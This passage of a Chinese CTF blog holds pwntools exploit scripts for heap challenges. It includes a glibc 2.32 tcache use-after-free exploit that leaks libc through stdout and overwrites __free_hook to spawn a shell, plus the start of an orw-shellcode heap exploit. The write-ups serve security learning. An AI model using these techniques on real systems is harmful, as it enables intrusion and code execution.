payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"size:\"</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"index:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content:\"</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">to_pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        add<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x310</span><span class=\"token punctuation\">)</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"b\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'choice:'</span><span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>shutdown_raw<span class=\"token punctuation\">(</span><span class=\"token string\">'send'</span><span class=\"token punctuation\">)</span>\n    data <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#pause()</span>\n    <span class=\"token keyword\">if</span> <span class=\"token string\">\"vnctf\"</span> <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n    <span class=\"token comment\">#p = process(binary)</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n    to_pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   White_Give_Flag.py\n@Time    :   2021/08/04 16:51:07\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"ff\"><a class=\"markdownIt-Anchor\" href=\"#ff\">#</a> ff</h1>\n<p>这题属于是明牌，让你在两次 edit，一次 show 的情况下做一道 2.32 的 uaf 题目 ex 的地方在于只能对最近的堆块操作</p>\n<p>一次 show 的给 heap 地址，两次 edit 一次给 double free 之间的清空 tcache fd，一次给修改 tcache 的 fd 即指向的下一个堆块为 tcache 管理块</p>\n<p>本题的中心思想是控制 tcache 管理块，通过合并成大块 free 掉构造出含有 libc 地址的 entry，覆盖低位爆破申请到 stdout 泄露出 libc 地址</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \ncontext<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>timeout <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./ff'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'node4.buuoj.cn'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'26589'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size:\"</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content:\"</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content:\"</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\none_gad <span class=\"token operator\">=</span> one_gadget<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#2.32 tcache fd指针与tcache管理块做过异或处理</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">to_pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    heap_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    heap_base <span class=\"token operator\">=</span> heap_addr <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">12</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"heap_addr\"</span><span class=\"token punctuation\">,</span>heap_addr<span class=\"token punctuation\">)</span>\n\n    edit<span class=\"token punctuation\">(</span><span class=\"token string\">\"x\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    edit<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>heap_base <span class=\"token operator\">+</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> heap_addr <span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>heap_addr<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n\n\n    payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>heap_base <span class=\"token operator\">+</span> <span class=\"token number\">0xa0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x200</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x80</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x40</span>  <span class=\"token operator\">+</span> <span class=\"token number\">0x70</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x70</span>  <span class=\"token operator\">+</span> <span class=\"token number\">0x60</span><span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>  p64<span class=\"token punctuation\">(</span>heap_base <span class=\"token operator\">+</span> <span class=\"token number\">0xa0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span><span class=\"token number\">8</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> payload <span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"h\"</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    payload <span class=\"token operator\">=</span>  p16<span class=\"token punctuation\">(</span><span class=\"token number\">0x96c0</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n\n    payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span><span class=\"token string\">\"\\x00\"</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n    leak_addr <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> leak_addr <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak_addr\"</span><span class=\"token punctuation\">,</span>leak_addr<span class=\"token punctuation\">)</span>\n\n    _IO_2_1_stdout_ <span class=\"token operator\">=</span> leak_addr <span class=\"token operator\">-</span> <span class=\"token number\">132</span>\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> _IO_2_1_stdout_ <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"_IO_2_1_stdout_\"</span><span class=\"token punctuation\">]</span>\n    free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__free_hook\"</span><span class=\"token punctuation\">]</span>\n    system <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span>\n\n    payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>free_hook<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span><span class=\"token number\">4</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        to_pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n        p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#p = process(binary)</span>\n        p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   ff.py\n@Time    :   2021/08/09 09:08:14\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"easyheap\"><a class=\"markdownIt-Anchor\" href=\"#easyheap\">#</a> Easyheap</h1>\n<p>安恒八月赛，我太菜了</p>\n<p><img src=\"/CTF/%E8%BF%91%E6%9C%9FPwn%E9%A2%98/4.png\" alt=\"img\"></p>\n<p>漏洞在于输入的 size 和调用 malloc 函数时的 size 不匹配，edit 时是看的输入的 size，知道这个就随便做了，为什么在比赛时候注意到了却没有深究啊，铸币吧，知道底层利用原理，却找不出表层漏洞那有个寄吧用啊</p>\n<p>开了个 b 沙箱，开了一个 rwx 的内存，直接往上面写 orw 的 shellcode，之后将这个地址写到随便一个 hook 上</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \ncontext<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>timeout <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./Easyheap'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'node4.buuoj.cn'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'25511'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token 